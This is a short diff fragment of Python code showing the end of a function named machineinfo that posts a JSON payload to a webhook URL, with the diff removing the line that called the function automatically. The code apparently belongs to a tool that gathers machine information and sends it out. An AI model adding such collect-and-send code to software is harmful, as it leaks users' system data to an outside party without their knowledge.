@@ -81,5 +81,4 @@ def machineinfo():
         "Content-Type": "Application/Json"
     }
     r = requests.post(hook, data=json.dumps(payload), headers=headers)
-    
-machineinfo()
+
